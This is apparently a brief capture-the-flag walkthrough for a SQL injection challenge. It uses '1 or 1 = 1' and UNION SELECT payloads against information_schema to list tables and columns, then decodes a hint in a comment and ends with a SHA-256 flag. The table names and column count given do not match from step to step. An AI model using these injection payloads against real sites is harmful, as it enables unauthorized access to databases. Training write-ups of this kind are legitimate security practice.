1. go to website then click on search images.
2. try see if ("1 or 1 = 1)" returns images.
3. then type "(1 or 1 = 1 UNION SELECT table_schema, table_name FROM information_schema.TABLES)"
4. use the search function(ctrl + f) and search for a table called list_images.
5. once you have found a table called Member_images now its time to find the columns .
6. then type "(1 or 1 = 1 UNION SELECT table_name, column_name FROM information_schema.COLUMNS)"
7. then we search the columns and there should be 4. id/url/title/comment.
8. then we search the columns and find 5th comment and says we have to decode 1928e8083cf461a51303633093573c46 and then lower all the letters then encrypt it with sha256.
9. f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188